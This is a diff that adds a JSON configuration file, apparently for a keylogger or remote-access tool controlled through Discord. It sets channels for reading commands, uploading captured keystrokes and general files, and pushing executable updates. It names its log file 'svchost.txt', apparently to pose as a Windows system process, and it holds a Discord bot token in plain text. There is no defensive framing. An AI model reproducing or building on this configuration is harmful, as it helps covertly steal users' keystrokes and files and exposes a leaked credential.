@@ -1,0 +1,13 @@
+{"stop_continue_file": "stop_continue.file",
+               "file_dimension_send": 10000,
+               "send_on_connect": "True",
+               "send_file_timer": 3600,
+               "write_file_timer": 1,
+               "log_file": "svchost.txt",
+               "discord_bot_TOKEN": "NTg1MzU4NzIzMDc0MjI4MjM0.XPYTyw.aVgggjdevv4PeXlEEtjJ--uTzaU",
+               "discord_channel_read_name": "commands",
+               "discord_channel_upload_keys": "upload_keys",
+               "discord_channel_upload_general": "upload_general",
+               "discord_channel_update_exe": "update_exe",
+               "user_id": "None"
+               }
